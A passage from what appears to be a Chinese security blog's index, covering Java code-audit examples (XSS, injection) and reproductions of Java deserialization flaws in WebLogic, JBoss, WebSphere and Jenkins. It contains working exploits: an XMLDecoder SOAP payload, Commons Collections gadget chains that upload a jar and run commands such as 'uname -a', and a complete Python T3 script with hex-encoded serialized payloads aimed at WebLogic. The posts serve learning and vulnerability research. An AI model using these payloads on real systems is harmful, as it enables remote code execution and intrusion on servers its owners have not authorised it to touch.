BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(new File(&quot;config/&quot;+name))); stream.write(bytes); stream.close(); return &quot;You successfully uploaded &quot; + name + &quot; into config/&quot; + name; &#125; &#125; catch (Exception e) &#123; return &quot;You failed to upload &quot; + name + &quot; =&gt; &quot; + e.getMessage(); &#125; &#125; return &quot;You failed to upload &quot; + name + &quot; because the file was empty.&quot;;&#125; 防范建议 控制文件名 控制文件内容 控制上传目录的权限 XSS原理这里仅仅拿了个反射的XSS做例子。 合法输入12alicehello,alice. 恶意输入121&lt;script&gt;alert(1)&lt;/script&gt;hello,1&lt;script&gt;alert(1)&lt;/script&gt;. Java代码分析不合规代码123456789101112public class XSSTestController &#123; public String XXSXXSInject(HttpServletRequest request)&#123; String data = request.getParameter(&quot;data&quot;); if (data!=null&amp;&amp;!data.isEmpty())&#123; return &quot;hello,&quot;+data+&quot;.&quot;; &#125; return &quot;404&quot;; &#125;&#125; 合规代码123456789public class XSSTestController &#123; public String XXSXXSInject(HttpServletRequest request)&#123; String data = request.getParameter(&quot;data&quot;); if (data!=null&amp;&amp;!data.isEmpty())&#123; return &quot;hello,&quot;+HtmlUtils.htmlEscape(data)+&quot;.&quot;; &#125; return &quot;404&quot;; &#125;&#125; 121&lt;script&gt;alert(1)&lt;/script&gt;hello,1&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;. 防范建议 对用户的输入进行html编码。 其他场景这些场景和前面提到的类似或者比较浅显易懂，就不贴代码了。 压缩文件问题没有检测压缩后的大小等细节。 其他未净化输入导致日志等处被污染顾名思义，应用程序的日志被污染，如果输出到页面上也容易触发XSS。 合法输入123orleven正常用户登录失败，记录日志.....User Login Successed for: orleven 恶意输入1234orleven\r\nUser Login Successed for: administrator恶意用户登录失败，记录日志.....User Login Failed for: orlevenUser Login Successed for: administrator 正则表达式的拼接原理与SQL注入基本相同。 合法输入12search=error(.*? +public\\[\\d+\\]+.*error.*) 恶意输入12search=.*)|(.*(.*? +public\\[\\d+\\]+.*.*)|(.*.*) XML注入的拼接原理与SQL注入基本相同。 合法输入123456quantity=1&lt;item&gt; &lt;name&gt;apple&lt;/name&gt; &lt;price&gt;500.0&lt;/price&gt; &lt;quantity&gt;1&lt;/quantity&gt;&lt;item&gt; 恶意输入123456quantity=1&lt;/quantity&gt;&lt;price&gt;5.0&lt;/price&gt;&lt;quantity&gt;1&lt;item&gt; &lt;name&gt;apple&lt;/name&gt; &lt;price&gt;500.0&lt;/price&gt; &lt;quantity&gt;1&lt;/quantity&gt;&lt;price&gt;5.0&lt;/price&gt;&lt;quantity&gt;1&lt;/quantity&gt;&lt;item&gt; 总结想要学好代码审计，就必须多接触主流的的框架，例如Spring等，在了解各各类框架之后，才能更快的上手。 相关测试代码参考文章]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic CVE-2017-10271]]></title>
    <url>%2F2017%2F12%2F23%2Fweblogic-cve-2017-10271%2F</url>
    <content type="text"><![CDATA[概述2017年10月17日Oracle推送更新补丁，修复其所发现的安全漏洞，其中CVE-2017-10271可能会导致攻击者获得Weblogic服务器权限，请尽快修复。 详情漏洞位置Oracle Weblogic Server WLS 安全组件 影响版本Oracle Weblogic Server 10.3.6.0Oracle Weblogic Server 12.2.1.2Oracle Weblogic Server 12.2.1.1Oracle Weblogic Server 12.1.3.0 漏洞复现修改Content-Type: text/xml，并向/wls-wsat/CoordinatorPortType发送POST数据包。123456789101112131415161718192021&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.7.0_79&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;2&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;test1234567&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot; /&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 具体复现如下： 总结发现POC早就是好几年前的了，主要是XMLDecoder组件没修，附：检测脚本。]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>code execution</tag>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Commons Collections Java 反序列化漏洞总结]]></title>
    <url>%2F2017%2F11%2F11%2Fjava-deserialize%2F</url>
    <content type="text"><![CDATA[概述Java 反序列化漏洞，‍‍序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。 序列化与反序列化12345String obj ="hello, world! This is a test!";FileOutputStream fos = new FileOutputStream("test/object");ObjectOutputStream os = new ObjectOutputStream(fos);os.writeObject(obj);os.close(); 12345FileInputStream fis = new FileInputStream("test/object");ObjectInputStream ois = new ObjectInputStream(fis);String obj2 = (String) ois.readObject(); System.out.print(obj2);ois.close(); 最后输出为hello, world! This is a test!。 Commons Collections JavaApache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。当然Java反序列化的问题就是出在org.apache.commons.collections这个库，这个库里的Package如下图所示： 123456789101112org.apache.commons.collectionsorg.apache.commons.collections.bagorg.apache.commons.collections.bidimaporg.apache.commons.collections.bufferorg.apache.commons.collections.collectionorg.apache.commons.collections.comparatorsorg.apache.commons.collections.functorsorg.apache.commons.collections.iteratorsorg.apache.commons.collections.keyvalueorg.apache.commons.collections.listorg.apache.commons.collections.maporg.apache.commons.collections.set 里面主要涉及到的类有ConstantTransformer、InvokerTransformer等 整个poc的逻辑可以这么理解，构建了BeforeTransformerMap的键值对，为其赋值，利用TransformedMap的decorate方法，可以对Map数据结构的key，value进行transforme。 TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空），第三个参数为Map对象内的value要经过的转化方法。 TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）); poc中对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行。 在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。 结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。 因此我们在poc中看见了下行的代码。 123456789101112131415161718192021222324252627282930 Transformer transforms[] = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String[].class&#125;, new Object[] &#123;commands&#125; )&#125;;Transformer transformerChain = new ChainedTransformer(transforms);Map tempMap = new HashMap();tempMap.put("value", "tentacle");Map exMap = TransformedMap.decorate(tempMap, null, transformerChain);Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;);ctor.setAccessible(true);instance = ctor.newInstance(new Object[] &#123;Target.class, exMap&#125;);ByteArrayOutputStream bo = new ByteArrayOutputStream(10);ObjectOutputStream out = new ObjectOutputStream(bo);out.writeObject(instance);out.flush();out.close();return bo.toByteArray(); 如果要实现一个可控的poc，需要对transformer链的构造进行理解。首先来看InvokerTransformer。 123456789101112131415 Transformer transforms[] = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String[].class&#125;, new Object[] &#123;commands&#125; )&#125;; 这样，这段恶意代码本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于： 1((Runtime)Runtime.class.getMethod("getMethod",null).invoke(null,null)).exec(commands); 其对应关系如下： 123456789101112131415161718192021222324// ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作Transformer transformerChain = new ChainedTransformer(transforms);// Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式Map tempMap = new HashMap();tempMap.put("value", "orleven");// 对Map类的数据结构进行转化// TransformedMap.decorate(目标Map, key的转化对象(单个或者链或者null), value的转化对象(单个或者链或者null));Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); //实例化一个AnnotationInvocationHandler类，将其成员变量memberValues赋值为精心构造的恶意TransformedMap对象。Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;);ctor.setAccessible(true);instance = ctor.newInstance(new Object[] &#123;Target.class, exMap&#125;);// 序列化后转化为byte数组，提交给未做安全检测的Java应用。Java应用在进行反序列化操作时，则会触发TransformedMap的变换函数，执行预设的命令。ByteArrayOutputStream bo = new ByteArrayOutputStream(10);ObjectOutputStream out = new ObjectOutputStream(bo);out.writeObject(instance);out.flush();out.close();return bo.toByteArray(); JBossJBoss JMXInvokerServlet 反序列化JBoss JMXInvokerServlet 存在反序列化漏洞。invoker/JMXInvokerServlet 可直接向http://192.168.111.145:8080/invoker/JMXInvokerServlet发送特殊构造的恶意代码，但是由于这个漏洞本身不回显，漏洞一开始并不好利用。后来大佬们通常先上传一个jar文件，然后通过加载Jar的方式进行异常封装，从而解决了回显的问题,具体poc如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103public static Object fileupload(String filepath, byte[] data) &#123; Object instance = null; try &#123;// ((FileOutputStream)FileOutputStream.class.getDeclaredConstructor(null).newInstance(null)).write(data); Transformer transforms[] = &#123; new ConstantTransformer(FileOutputStream.class), new InvokerTransformer("getDeclaredConstructor", new Class[] &#123;Class[].class&#125;, new Object[] &#123;new Class[] &#123;String.class&#125;&#125; ), new InvokerTransformer("newInstance", new Class[] &#123;Object[].class&#125;, new Object[] &#123;new Object[] &#123;filepath&#125;&#125; ), new InvokerTransformer("write", new Class[] &#123;byte[].class&#125;, new Object[] &#123;data&#125; ) &#125;; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put("value", "orleven"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;); ctor.setAccessible(true); instance = ctor.newInstance(new Object[]&#123;Target.class, exMap&#125;); &#125;catch (Exception e)&#123; e.printStackTrace(); return null; &#125; return instance; &#125;public static Object classInject(String packUri, String className, String[] code) &#123; Object instance = null; try &#123; // ((URLClassLoader)URLClassLoader.class.getMethod("newInstance",null).invoke(null,packUri)).loadClass(className).getMethod("main",null).invoke(null,code) Transformer transforms[] = &#123; new ConstantTransformer(URLClassLoader.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"newInstance", new Class[] &#123;URL[].class&#125;&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[] &#123;new URL[] &#123;new URL(packUri)&#125;&#125;&#125; ), new InvokerTransformer("loadClass", new Class[] &#123;String.class&#125;, new Object[] &#123;className&#125;), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"main", new Class[] &#123;String[].class&#125;&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[] &#123;code&#125;&#125; ) &#125;; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put("value", "orleven"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;); ctor.setAccessible(true); instance = ctor.newInstance(new Object[]&#123;Target.class, exMap&#125;); &#125;catch (Exception e)&#123; e.printStackTrace(); return null; &#125; return instance; &#125; public static byte[] getPayload(Object instance)&#123; try&#123; ByteArrayOutputStream bo = new ByteArrayOutputStream(10); ObjectOutputStream out = new ObjectOutputStream(bo); out.writeObject(instance); out.flush(); out.close(); return bo.toByteArray(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125; // 上传jar getPayload(fileupload("util.jar",filedata)); // 执行命令 getPayload(classInject("file:util.jar","jc.util.CommUtil",new String[]&#123;"data","-action","runcmd","uname -a"&#125;)); // 下载文件 getPayload(classInject("file:util.jar","jc.util.CommUtil",new String[]&#123;"data","-action","file-download",filename&#125;)); JBoss CVE-2017-12149JBoss /invoker/readonly 存在反序列化漏洞，即没有对数据进行任何的安全处理便进行了反序列化处理，造成了漏洞的形成。 访问服务器的/invoker/readonly页面，服务器返回500错误 这个漏洞的POC和前一个JBoss反序列化漏洞基本相同，所以这里就不贴代码了。 发送payload后服务端的日志如下： Weblogic因为weblogic会把异常直接打印到服务器端的控制台上，所以在jboss中通过异常封装回显的方法在weblogic上并不适用。但是weblogic有更方便的方法，weblogic是通过T3协议来传输序列化的类，那我们就可以通过T3协议来实现exploit和server的通信，因为weblogic的T3协议和WEB协议共用同一个端口，所以只要能访问weblogic，就可以利用，不需要加载远程类，因此对服务器能否连外网没有要求。 T3 协议这里主要介绍下T3协议，不想看的可以跳过这里。T3 也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。WebLogic Server 中的 RMI（远程方法调用） 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。服务器实例将跟踪所连接的每个 Java 虚拟机（Java Virtual Machine，简称 JVM），并创建单个 T3 连接以承担 JVM 的所有流量。请参阅“管理控制台联机帮助”中的配置 T3 协议。 使用T3协议向服务器发送数据：1t3 7.0.0.0\nAS:10\nHL:19\n\n 第一行为t3加weblogic客户端的版本号。 weblogic服务器的返回数据为:1HELO:10.0.2.0.false\nAS:2048\nHL:19\n\n 第一行为HELO:加weblogic服务器的版本号。weblogic客户端与服务器发送的数据均以\n\n结尾。 经测试，使用1t3 9.2.0\nAS:255\nHL:19\n\n 字符串作为T3的协议头发送给weblogic9、weblogic10g、weblogic11g、weblogic12c均合法。 在收到服务器的返回数据包后，就可了发送poc了。 poc的结构为：发送的数据长度 + weblogic的固定数据 + 反序列化的恶意代码 + 其他数据，具体如下： 即可触发漏洞。 CVE-2015-4852这个版本没有任何的过滤，可直接利用。 CVE-2016-0638、CVE-2016-3510、CVE-2017-3248因为weblogic的补丁是采用黑名单的过滤方式进行修补，容易有绕过的方式，下面就是大佬们的相关脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*- coding: utf-8 -*-import socketimport timeimport re## @author iswin@threathunter.org# reffer: nessus#VUL=['CVE-2016-0638','CVE-2016-3510','CVE-2017-3248']PAYLOAD=['aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78','aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870','aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078']VER_SIG=['weblogic.jms.common.StreamMessageImpl','org.apache.commons.collections.functors.InvokerTransformer','\\$Proxy[0-9]+']def t3handshake(sock,server_addr): sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) sock.recv(1024) print 'handshake successful'def buildT3RequestObject(sock,port): data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('&#123;:04x&#125;'.format(dport)) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) print 'send request payload successful,recv length:%d'%(len(sock.recv(2048)))def sendEvilObjData(sock,data): payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('&#123;:08x&#125;'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) res = '' try: while True: res += sock.recv(4096) time.sleep(0.1) except Exception as e: pass return resdef checkVul(res,server_addr,index): p=re.findall(VER_SIG[index], res, re.S) if len(p)&gt;0: print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index]) else: print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index])def run(dip,dport,index): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整 sock.settimeout(50) server_addr = (dip, dport) t3handshake(sock,server_addr) buildT3RequestObject(sock,dport) rs=sendEvilObjData(sock,PAYLOAD[index]) checkVul(rs,server_addr,index)if __name__=="__main__": dip = '10.8.56.17' dport = 7001 for i in range(0,len(VUL)): run(dip,dport,i) WebSphereCVE-2015-4852WebSphere的反序列化漏洞发生的位置在SOAP的通信端口8880，使用的通信协议是https，发送的数据是XML格式的数据。 这个版本的Websphere没进行任何的过滤处理，直接进行了反序列化。 所以只要把恶意代码（和之前jboss的攻击方式一样）base64编码后通过SOAP协议发送至有漏洞的服务器即可命令执行。 JenkinsCVE-2015-8103想要使用这个漏洞利用Java应用，则需要找一个序列化对象的接收入口，并且这个Java应用使用了Commons Collections库。Jenkins是一个开源的持续集成软件。Jenkins启动后会开放多个端口，除了Web控制台之外还有一个CLI端口。CLI端口为随机的高端口，通过jenkins目录下的WEB-INF/jenkins-cli.jar程序可以和CLI端口进行通信。分析通信数据包发现存在base64编码的Java序列化特征值rO0AB。 jenkins-cli.jar在与CLI端口通信之前，会先HTTP GET请求一下jenkins的Web控制台，从响应包中解析出CLI的端口，再做后续通信。 从下图的head头部可以看到随机的序列化对象的接收入口。 X-Jenkins-CLI2-Port是采用SSL加密通信，而如果未解析到X-Jenkins-CLI2-Port头，则会解析X-Jenkins-CLI-Port头，此时Jenkins-CLI通信协议自动降为Version1，并且无SSL加密。 只要将恶意代码序列化后进行base64加密（base64编码后不能有换行），并代替掉之前截到的数据包中的base64字段即可。 由于此漏洞的命令执行结果也是不回显的，上传jar包的方式也只能打印到控制台，依旧不能解决回显问题。如果采用nslookup等方式来检测漏洞也常有漏网之鱼（如果服务器不能主动向外发包）。 总结花了几天时间复现了这些著名的漏洞，颇有收获，稍微了解了各个中间件的一些情况以及的反序列化漏洞的触发方式。 参考文章1参考文章2参考文章3参考文章4参考文章5参考文章6参考文章7参考文章8参考文章9]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>code execution</tag>
        <tag>java unserialize</tag>
        <tag>jboss</tag>
        <tag>weblogic</tag>
        <tag>jenkins</tag>
        <tag>websphere</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap Code Analysis]]></title>
    <url>%2F2017%2F09%2F27%2Fsqlmap-code-analysis%2F</url>
